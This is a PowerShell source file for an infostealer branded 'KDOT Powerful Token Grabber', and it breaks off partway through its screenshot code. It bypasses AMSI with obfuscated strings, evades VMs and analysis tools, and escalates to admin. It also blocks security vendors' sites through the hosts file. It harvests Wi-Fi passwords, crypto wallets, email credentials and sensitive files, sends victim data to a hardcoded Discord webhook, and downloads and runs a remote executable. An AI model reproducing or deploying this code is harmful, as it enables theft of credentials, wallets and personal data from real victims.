$debug = $false

if ($debug) {
    $ProgressPreference = 'Continue'
}
else {
    $ErrorActionPreference = 'SilentlyContinue'
    $ProgressPreference = 'SilentlyContinue'
}


function KDMUTEX {
    $AppId = "a0e59cd1-5d22-4ae1-967b-1bf3e1d36d6b" 
    $CreatedNew = $false
    $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
    if ( -not $CreatedNew ) {
        throw "An instance of this script is already running."
    }
    else {
        VMBYPASSER
    }
}

Add-Type -AssemblyName PresentationCore, PresentationFramework

$webhook = "https://discord.com/api/webhooks/1249384977871671326/BINY1NebSBc3CZNIp18xCLEgjVDUwyh5LpU_a7WneAjjDvbM_FYO6bNJdaQWfJ5JUhW0"
$avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"


# Request admin with AMSI bypass
function INVOKE-AC {
    ${kDOt} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtkb3QuU2V0VmFsdWUoJG51bGwsJHRydWUp")) | &([regex]::Unescape("\u0069\u0065\u0078"))
    $kdotcheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    return $kdotcheck
}

function Hide-Console {
    if (-not $debug) {
        if (-not ("Console.Window" -as [type])) { 
            Add-Type -Name Window -Namespace Console -MemberDefinition '
                [DllImport("Kernel32.dll")]
                public static extern IntPtr GetConsoleWindow();
                [DllImport("user32.dll")]
                public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
                '
        }
        $consolePtr = [Console.Window]::GetConsoleWindow()
        $null = [Console.Window]::ShowWindow($consolePtr, 0)
    }
}

function make_error_page {
    param(
        [Parameter(Mandatory = $true)]
        [string]$error_message
    )
    $null = [System.Windows.MessageBox]::Show("$error_message", "ERROR", 0, 16)
}

function Search-Mac ($mac_addresses) {
    $pc_mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -Expand macaddress) -join ","
    ForEach ($mac123 in $mac_addresses) {
        if ($pc_mac -contains $mac123) {
            return $true
        }
    }
    return $false
}

function Search-IP ($ip_addresses) {
    $pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $pc_ip = $pc_ip.Content
    ForEach ($ip123 in $ip_addresses) {
        if ($pc_ip -contains $ip123) {
            return $true
        }
    }
    return $false
}

function Search-HWID ($hwids) {
    $pc_hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    ForEach ($hwid123 in $hwids) {
        if ($pc_hwid -contains $hwid123) {
            return $true
        }
    }
    return $false
}

function Search-Username ($usernames) {
    $pc_username = $env:USERNAME
    ForEach ($username123 in $usernames) {
        if ($pc_username -contains $username123) {
            return $true
        }
    }
    return $false
}

function ram_check {
    $ram = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object { [Math]::Round(($_.Sum / 1GB), 2) }
    if ($ram -lt 4) {
        make_error_page "RAM CHECK FAILED"
        Start-Sleep -s 3
        exit
    }
}

function VMBYPASSER {
    ram_check
    $processnames = @(
        "autoruns",
        "die",
        "dumpcap",
        "dumpcap",
        "fakenet",
        "fiddler",
        "filemon",
        "hookexplorer",
        "httpdebugger",
        "immunitydebugger",
        "importrec",
        "joeboxcontrol",
        "joeboxserver",
        "lordpe",
        "ollydbg",
        "petools",
        "proc_analyzer",
        "processhacker",
        "procexp",
        "procmon",
        "qemu-ga",
        "qga",
        "resourcehacker",
        "sandman",
        "scylla_x64",
        "sysanalyzer",
        "sysinspector",
        "sysmon",
        "tcpview",
        "tcpview64",
        "tcpdump",
        "vboxservice",
        "vboxtray",
        "vboxcontrol",
        "vmacthlp",
        "vmwareuser",
        "windbg",
        "wireshark",
        "x32dbg",
        "x64dbg",
        "xenservice"
    )
    $detectedProcesses = $processnames | ForEach-Object {
        $processName = $_
        if (Get-Process -Name $processName -Erroraction SilentlyContinue) {
            $processName
        }
    }

    if ($null -eq $detectedProcesses) { 
        Invoke-ANTITOTAL
    }
    else { 
        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
        Remove-Item $PSCommandPath -Force 
    }
}

function Invoke-ANTITOTAL {
    $urls = @(
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
    )
    $functions = @(
        "Search-Mac",
        "Search-IP",
        "Search-HWID",
        "Search-Username"
    )
    
    for ($i = 0; $i -lt $urls.Count; $i++) {
        $url = $urls[$i]
        $functionName = $functions[$i]
        
        $result = Invoke-WebRequest -Uri $url -UseBasicParsing
        if ($result.StatusCode -eq 200) {
            $content = $result.Content
            $function = Get-Command -Name $functionName
            $output = & $function.Name $content
            
            if ($output -eq $true) {
                make_error_page "Detected VM"
                Start-Sleep -s 3
                exit
            }
        }
        else {
            ""
        }
    }
    Invoke-TASKS
}

function HOSTS-BLOCKER {
    $KDOT = Select-String -Path "$env:windir\System32\Drivers\etc\hosts" -Pattern "GODFATHER"
    if ($KDOT -ne $null) {}else {
        Add-Content c:\Windows\System32\Drivers\etc\hosts "`n#GODFATHER `n0.0.0.0 www.malwarebytes.com`n0.0.0.0 malwarebytes.com`n0.0.0.0 143.204.176.32`n0.0.0.0 www.antivirussoftwareguide.com`n0.0.0.0 antivirussoftwareguide.com`n0.0.0.0 68.183.21.156`n0.0.0.0 www.norton.com`n0.0.0.0 norton.com`n0.0.0.0 23.99.92.83`n0.0.0.0 www.avg.com`n0.0.0.0 avg.com`n0.0.0.0 69.94.64.29`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.avast.com`n0.0.0.0 avast.com`n0.0.0.0 2.22.100.83`n0.0.0.0 www.uk.pcmag.com`n0.0.0.0 uk.pcmag.com`n0.0.0.0 104.17.101.99`n0.0.0.0 www.bitdefender.co.uk`n0.0.0.0 bitdefender.co.uk`n0.0.0.0 172.64.144.176`n0.0.0.0 www.webroot.com`n0.0.0.0 webroot.com`n0.0.0.0 66.35.53.194`n0.0.0.0 www.mcafee.com`n0.0.0.0 mcafee.com`n0.0.0.0 161.69.29.243`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.go.crowdstrike.com`n0.0.0.0 go.crowdstrike.com`n0.0.0.0 104.18.64.82`n0.0.0.0 www.sophos.com`n0.0.0.0 sophos.com`n0.0.0.0 23.198.89.209`n0.0.0.0 www.f-secure.com`n0.0.0.0 f-secure.com`n0.0.0.0 23.198.76.113`n0.0.0.0 www.gdatasoftware.com`n0.0.0.0 gdatasoftware.com`n0.0.0.0 212.23.151.164`n0.0.0.0 www.trendmicro.com`n0.0.0.0 trendmicro.com`n0.0.0.0 216.104.20.24`n0.0.0.0 www.virustotal.com`n0.0.0.0 virustotal.com`n0.0.0.0 216.239.32.21`n0.0.0.0 www.acronis.com`n0.0.0.0 acronis.com`n0.0.0.0 34.120.97.237`n0.0.0.0 www.adaware.com`n0.0.0.0 adaware.com`n0.0.0.0 104.16.236.79`n0.0.0.0 www.ahnlab.com`n0.0.0.0 ahnlab.com`n0.0.0.0 211.233.80.53`n0.0.0.0 www.antiy.net`n0.0.0.0 antiy.net`n0.0.0.0 47.91.137.195`n0.0.0.0 www.symantec.com`n0.0.0.0 symantec.com`n0.0.0.0 50.112.202.115`n0.0.0.0 www.broadcom.com`n0.0.0.0 broadcom.com`n0.0.0.0 50.112.202.115`n0.0.0.0 www.superantispyware.com`n0.0.0.0 superantispyware.com`n0.0.0.0 44.231.57.118`n0.0.0.0 www.sophos.com`n0.0.0.0 sophos.com`n0.0.0.0 23.198.89.209`n0.0.0.0 www.sangfor.com`n0.0.0.0 sangfor.com`n0.0.0.0 151.101.2.133`n0.0.0.0 www.rising-global.com`n0.0.0.0 rising-global.com`n0.0.0.0 219.238.233.230`n0.0.0.0 www.webroot.com`n0.0.0.0 webroot.com`n0.0.0.0 66.35.53.194`n0.0.0.0 www.wearethinc.com`n0.0.0.0 wearethinc.com`n0.0.0.0 217.199.161.10`n0.0.0.0 www.cybernews.com`n0.0.0.0 cybernews.com`n0.0.0.0 172.66.43.197`n0.0.0.0 www.quickheal.com`n0.0.0.0 quickheal.com`n0.0.0.0 103.228.50.23`n0.0.0.0 www.pandasecurity.com`n0.0.0.0 pandasecurity.com`n0.0.0.0 91.216.218.44`n0.0.0.0 www.trendmicro.com`n0.0.0.0 trendmicro.com`n0.0.0.0 216.104.20.24`n0.0.0.0 www.guard.io`n0.0.0.0 guard.io`n0.0.0.0 34.102.139.130`n0.0.0.0 www.maxpcsecure.com`n0.0.0.0 maxpcsecure.com`n0.0.0.0 70.35.199.101`n0.0.0.0 www.maxsecureantivirus.com`n0.0.0.0 maxsecureantivirus.com`n0.0.0.0 70.35.199.101`n0.0.0.0 www.akamai.com`n0.0.0.0 akamai.com`n0.0.0.0 104.82.181.162`n0.0.0.0 www.lionic.com`n0.0.0.0 lionic.com`n0.0.0.0 220.130.53.233`n0.0.0.0 www.ccm.net`n0.0.0.0 ccm.net`n0.0.0.0 23.55.12.105`n0.0.0.0 www.kaspersky.co.uk`n0.0.0.0 kaspersky.co.uk`n0.0.0.0 185.85.15.26`n0.0.0.0 www.crowdstrike.com`n0.0.0.0 crowdstrike.com`n0.0.0.0 104.18.64.82`n0.0.0.0 www.k7computing.com`n0.0.0.0 k7computing.com`n0.0.0.0 52.172.54.225`n0.0.0.0 www.softonic.com`n0.0.0.0 softonic.com`n0.0.0.0 35.227.233.104`n0.0.0.0 www.ikarussecurity.com`n0.0.0.0 ikarussecurity.com`n0.0.0.0 91.212.136.200`n0.0.0.0 www.gridinsoft.com`n0.0.0.0 gridinsoft.com`n0.0.0.0 104.26.9.187`n0.0.0.0 www.simspace.com`n0.0.0.0 simspace.com`n0.0.0.0 104.21.82.22`n0.0.0.0 www.osirium.com`n0.0.0.0 osirium.com`n0.0.0.0 35.197.237.129`n0.0.0.0 www.gdatasoftware.co.uk`n0.0.0.0 gdatasoftware.co.uk`n0.0.0.0 212.23.151.164`n0.0.0.0 www.gdatasoftware.com`n0.0.0.0 gdatasoftware.com`n0.0.0.0 212.23.151.164`n0.0.0.0 www.basicsprotection.com`n0.0.0.0 basicsprotection.com`n0.0.0.0 3.111.153.145`n0.0.0.0 www.fortinet.com`n0.0.0.0 fortinet.com`n0.0.0.0 3.1.92.70`n0.0.0.0 www.f-secure.com`n0.0.0.0 f-secure.com`n0.0.0.0 23.198.76.113`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.escanav.com`n0.0.0.0 escanav.com`n0.0.0.0 67.222.129.224`n0.0.0.0 www.emsisoft.com`n0.0.0.0 emsisoft.com`n0.0.0.0 104.20.206.62`n0.0.0.0 www.drweb.com`n0.0.0.0 drweb.com`n0.0.0.0 178.248.233.94`n0.0.0.0 www.cyren.com`n0.0.0.0 cyren.com`n0.0.0.0 216.163.188.84`n0.0.0.0 www.cynet.com`n0.0.0.0 cynet.com`n0.0.0.0 172.67.38.94`n0.0.0.0 www.comodosslstore.com`n0.0.0.0 comodosslstore.com`n0.0.0.0 172.67.28.161`n0.0.0.0 www.clamav.net`n0.0.0.0 clamav.net`n0.0.0.0 198.148.79.54`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.totalav.com`n0.0.0.0 totalav.com`n0.0.0.0 34.117.198.220`n0.0.0.0 www.bitdefender.co.uk`n0.0.0.0 bitdefender.co.uk`n0.0.0.0 172.64.144.176`n0.0.0.0 www.baidu.com`n0.0.0.0 baidu.com`n0.0.0.0 39.156.66.10`n0.0.0.0 www.avira.com`n0.0.0.0 avira.com`n0.0.0.0 52.58.28.12`n0.0.0.0 www.avast.com`n0.0.0.0 avast.com`n0.0.0.0 2.22.100.83`n0.0.0.0 www.arcabit.pl`n0.0.0.0 arcabit.pl`n0.0.0.0 188.166.107.22`n0.0.0.0 www.surfshark.com`n0.0.0.0 surfshark.com`n0.0.0.0 104.18.120.34`n0.0.0.0 www.nordvpn.com`n0.0.0.0 nordvpn.com`n0.0.0.0 104.17.49.74`n0.0.0.0 support.microsoft.com`n0.0.0.0 www.support.microsoft.com`n"
        param ([string[]]$Browsers = @("chrome", "firefox", "iexplore", "opera", "brave", "msedge"))
        $terminatedProcesses = @()
        foreach ($browser in $Browsers) {
            $process = Get-Process -Name $browser -ErrorAction 'SilentlyContinue'
            if ($process -ne $null) {
                Stop-Process -Name $browser -ErrorAction 'SilentlyContinue'
                $terminatedProcesses += $browser
            }
        }
        Start-Sleep -Seconds 4
        foreach ($browser in $terminatedProcesses) {
            Start-Process $browser 
        }
        return $terminatedProcesses
    }
}


function Request-Admin {
    while (!(INVOKE-AC)) {
        try {
            Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs
            exit
        }
        catch {}
    }
}

function Backup-Data {
    $folder_general = "$env:APPDATA\KDOT\DATA"
    $folder_messaging = "$env:APPDATA\KDOT\DATA\Messaging Sessions"
    $folder_gaming = "$env:APPDATA\KDOT\DATA\Gaming Sessions"
    $folder_crypto = "$env:APPDATA\KDOT\DATA\Crypto Wallets"
    $folder_vpn = "$env:APPDATA\KDOT\DATA\VPN Clients"
    $folder_email = "$env:APPDATA\KDOT\DATA\Email Clients"
    $important_files = "$env:APPDATA\KDOT\DATA\Important Files"
    $browser_data = "$env:APPDATA\KDOT\DATA\Browser Data"

    New-Item -ItemType Directory -Path $folder_general -Force
    New-Item -ItemType Directory -Path $folder_messaging -Force
    New-Item -ItemType Directory -Path $folder_gaming -Force
    New-Item -ItemType Directory -Path $folder_crypto -Force
    New-Item -ItemType Directory -Path $folder_vpn -Force
    New-Item -ItemType Directory -Path $browser_data -Force
    New-Item -ItemType Directory -Path $folder_email -Force
    New-Item -ItemType Directory -Path $important_files -Force

    #bulk data
    $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $ip = $ip.Content
    $ip > $folder_general\ip.txt
    $lang = (Get-WinUserLanguageList).LocalizedName
    $date = (get-date).toString("r")
    Get-ComputerInfo > $folder_general\system_info.txt
    $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $osbuild = (Get-ItemProperty -Path c:\windows\system32\hal.dll).VersionInfo.FileVersion
    $displayversion = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('DisplayVersion')
    $model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
    $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
    $uuid > $folder_general\uuid.txt
    $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
    $cpu > $folder_general\cpu.txt
    $gpu = (Get-WmiObject Win32_VideoController).Name 
    $gpu > $folder_general\GPU.txt
    $format = " GB"
    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object { "{0:N2}" -f ([math]::round(($_.Sum / 1GB), 2)) }
    $raminfo = "$total" + "$format"  
    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -Expand macaddress) -join ","
    $mac > $folder_general\mac.txt
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    netstat -ano > $folder_general\netstat.txt
    $mfg = (Get-WmiObject win32_computersystem).Manufacturer
    #end of bulk data
	
    function Get-Uptime {
        $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
        $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
        $uptimedata
    }
    $uptime = Get-Uptime

    function get-installed-av {
        $wmiQuery = "SELECT * FROM AntiVirusProduct"
        $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
        $AntivirusProduct.displayName 
    }
    $avlist = get-installed-av -autosize | Format-Table | out-string


    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | % { $name = $_.Matches.Groups[1].Value.Trim(); $_ } | % { (netsh wlan show profile name="$name" key=clear) } | Select-String "Key Content\W+\:(.+)$" | % { $pass = $_.Matches.Groups[1].Value.Trim(); $_ } | % { [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass } } | Format-Table -AutoSize 
    $wifi = $wifipasslist | out-string 
    $wifi > $folder_general\WIFIPasswords.txt

    $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[0]
    $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[2]  
    $split = "x"
    $screen = "$width" + "$split" + "$height"

    #misc data
    Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $folder_general\StartUpApps.txt
    Get-WmiObject win32_service | Where-Object State -match "running" | Select-Object Name, DisplayName, PathName, User | Sort-Object Name | Format-Table -wrap -autosize >  $folder_general\running-services.txt
    Get-WmiObject win32_process | Select-Object Name, Description, ProcessId, ThreadCount, Handles, Path | Format-Table -wrap -autosize > $folder_general\running-applications.txt
    Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $folder_general\Installed-Applications.txt
    Get-NetAdapter | Format-Table Name, InterfaceDescription, PhysicalMediaType, NdisPhysicalMedium -AutoSize > $folder_general\NetworkAdapters.txt


    function diskdata {
        $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2"
        $results = foreach ($disk in $disks) {
            if ($disk.Size -gt 0) {
                $SizeOfDisk = [math]::round($disk.Size / 1GB, 0)
                $FreeSpace = [math]::round($disk.FreeSpace / 1GB, 0)
                $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
                [int]$FreePercent = ($FreeSpace / $SizeOfDisk) * 100
                [int]$usedpercent = ($usedspace / $SizeOfDisk) * 100
                [PSCustomObject]@{
                    Drive             = $disk.Name
                    Name              = $disk.VolumeName
                    "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                    "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, ($FreePercent)
                    "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, ($usedpercent)
                }
            }
        }
        $results 
    }
    $alldiskinfo = diskdata | out-string 
    $alldiskinfo > $folder_general\diskinfo.txt


    function Get-ProductKey {
        try {
            $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
            $keyName = 'BackupProductKeyDefault'
            $backupProductKey = Get-ItemPropertyValue -Path $regPath -Name $keyName
            return $backupProductKey
        }
        catch {
            return "No product key found"
        }
    }
    Get-ProductKey > $folder_general\productkey.txt

    If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
        $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
        New-Item -Path "$folder_email\Thunderbird" -ItemType Directory | Out-Null
        Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$folder_email\Thunderbird" -Recurse -Force
    }
	
    function Invoke-Crypto_Wallets {
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
            New-Item -Path "$folder_crypto\Armory" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Armory" -Recurse | Copy-Item -Destination "$folder_crypto\Armory" -Recurse -Force
        }
    
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Atomic") {
            New-Item -Path "$folder_crypto\Atomic" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Atomic\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$folder_crypto\Atomic" -Recurse -Force
        }
    
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin") {
            New-Item -Path "$folder_crypto\BitcoinCore" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin\Bitcoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\BitcoinCore" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\bytecoin") {
            New-Item -Path "$folder_crypto\bytecoin" -ItemType Directory | Out-Null
            Get-ChildItem ("$env:userprofile\AppData\Roaming\bytecoin", "$env:userprofile") -Include *.wallet -Recurse | Copy-Item -Destination "$folder_crypto\bytecoin" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Local\Coinomi") {
            New-Item -Path "$folder_crypto\Coinomi" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Local\Coinomi\Coinomi\wallets" -Recurse | Copy-Item -Destination "$folder_crypto\Coinomi" -Recurse -Force
        }
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Dash") {
            New-Item -Path "$folder_crypto\DashCore" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Dash\Dash-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\DashCore" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Electrum") {
            New-Item -Path "$folder_crypto\Electrum" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Electrum\wallets" -Recurse | Copy-Item -Destination "$folder_crypto\Electrum" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Ethereum") {
            New-Item -Path "$folder_crypto\Ethereum" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Ethereum\keystore" -Recurse | Copy-Item -Destination "$folder_crypto\Ethereum" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Exodus") {
            New-Item -Path "$folder_crypto\exodus.wallet" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\exodus.wallet" -Recurse | Copy-Item -Destination "$folder_crypto\exodus.wallet" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Guarda") {
            New-Item -Path "$folder_crypto\Guarda" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Guarda\IndexedDB" -Recurse | Copy-Item -Destination "$folder_crypto\Guarda" -Recurse -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\com.liberty.jaxx") {
            New-Item -Path "$folder_crypto\liberty.jaxx" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb" -Recurse | Copy-Item -Destination "$folder_crypto\liberty.jaxx" -Recurse -Force
        }
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Litecoin") {
            New-Item -Path "$folder_crypto\Litecoin" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Litecoin\Litecoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$folder_crypto\Litecoin" -Recurse -Force
        }
        If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\monero-project") {
            New-Item -Path "$folder_crypto\Monero" -ItemType Directory | Out-Null
            Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\monero-project\monero-core" -Name wallet_path).wallet_path -Recurse | Copy-Item -Destination "$folder_crypto\Monero" -Recurse  -Force
        }
        If (Test-Path -Path "$env:userprofile\AppData\Roaming\Zcash") {
            New-Item -Path "$folder_crypto\Zcash" -ItemType Directory | Out-Null
            Get-ChildItem "$env:userprofile\AppData\Roaming\Zcash" -Recurse | Copy-Item -Destination "$folder_crypto\Zcash" -Recurse -Force
        }
    }
    Invoke-Crypto_Wallets

    $embed_and_body = @{
        "username"    = "KDOT"
        "content"     = "@everyone"
        "title"       = "KDOT"
        "description" = "Powerful Token Grabber"
        "color"       = "3447003"
        "avatar_url"  = "https://i.postimg.cc/k58gQ03t/PTG.gif"
        "url"         = "https://discord.gg/vk3rBhcj2y"
        "embeds"      = @(
            @{
                "title"       = "POWERSHELL GRABBER"
                "url"         = "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/tree/main"
                "description" = "New victim info collected !"
                "color"       = "3447003"
                "footer"      = @{
                    "text" = "Made by KDOT, GODFATHER and CHAINSKI"
                }
                "thumbnail"   = @{
                    "url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
                }
                "fields"      = @(
                    @{
                        "name"  = ":satellite: IP"
                        "value" = "``````$ip``````"
                    },
                    @{
                        "name"  = ":bust_in_silhouette: User Information"
                        "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
                    },
                    @{
                        "name"  = ":shield: Antivirus"
                        "value" = "``````$avlist``````"
                    },
                    @{
                        "name"  = ":computer: Hardware"
                        "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                    },
                    @{
                        "name"  = ":floppy_disk: Disk"
                        "value" = "``````$alldiskinfo``````"
                    }
                    @{
                        "name"  = ":signal_strength: WiFi"
                        "value" = "``````$wifi``````"
                    }
                )
            }
        )
    }

    $payload = $embed_and_body | ConvertTo-Json -Depth 10
    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null

    Function Invoke-GrabFiles {
        $grabber = @(
            "2fa",
            "acc",
            "atomic wallet",
            "account",
            "backup",
            "backupcode",
            "bitwarden",
            "bitcoin",
            "code",
            "coinbase",
            "crypto",
            "dashlane",
            "default",
            "discord",
            "disk",
            "eth",
            "exodus",
            "facebook",
            "fb",
            "keepass",
            "keepassxc",
            "keys",
            "lastpass",
            "login",
            "mail",
            "memo",
            "metamask",
            "note",
            "nordpass",
            "pass",
            "paypal",
            "private",
            "pw",
            "recovery",
            "remote",
            "secret",
            "seedphrase",
            "wallet seed",
            "server",
            "syncthing",
            "trading",
            "token",
            "wal",
            "wallet"
        )
        $dest = $important_files
        $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
        [regex] $grab_regex = "(" + (($grabber | ForEach-Object { [regex]::escape($_) }) -join "|") + ")"
    (Get-ChildItem -path $paths -Include "*.pdf", "*.txt", "*.doc", "*.csv", "*.rtf", "*.docx" -r | Where-Object Length -lt 1mb) -match $grab_regex | Copy-Item -Destination $dest -Force
    }
    Invoke-GrabFiles

    $items = Get-ChildItem -Path "$folder_general" -Filter out*.jpg
    foreach ($item in $items) {
        $name = $item.Name
        curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$folder_general\$name\`"" $webhook | out-null
        Remove-Item -Path "$folder_general\$name" -Force
    }
	
    Set-Location "$env:LOCALAPPDATA\Temp"

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Stop-Process -Name DiscordTokenProtector -Force -ErrorAction 'SilentlyContinue'
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force -ErrorAction 'SilentlyContinue'
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }

    (New-Object System.Net.WebClient).DownloadFile("https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")

    Stop-Process -Name "discord" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
    Stop-Process -Name "discordcanary" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
    Stop-Process -Name "discordptb" -Force -ErrorAction 'SilentlyContinue'  | Out-Null


    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
    $proc.WaitForExit()

    $main_temp = "$env:localappdata\temp"
    $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $screens = [Windows.Forms.Screen]::AllScreens
    $top = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
    $left = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
    $width = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
